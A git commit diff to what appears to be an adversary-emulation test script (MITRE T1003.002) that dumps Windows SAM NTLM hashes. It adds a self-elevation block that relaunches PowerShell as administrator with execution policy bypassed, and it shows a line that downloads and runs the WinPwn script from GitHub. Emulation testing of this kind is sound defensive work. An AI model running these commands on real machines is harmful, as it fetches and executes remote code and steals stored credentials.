6a8dfa2e24cff38d160e91a692954e4478a242ea
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-27 15:21:14 +0800

    Added admin elevated PowerShell to T1003.002

--- Credential Access/T1003.002.ps1
+++ Credential Access/T1003.002.ps1
@@ -1,5 +1,10 @@
 #Atomic Test #7 - WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
 
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
+    exit;
+}
+
 $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
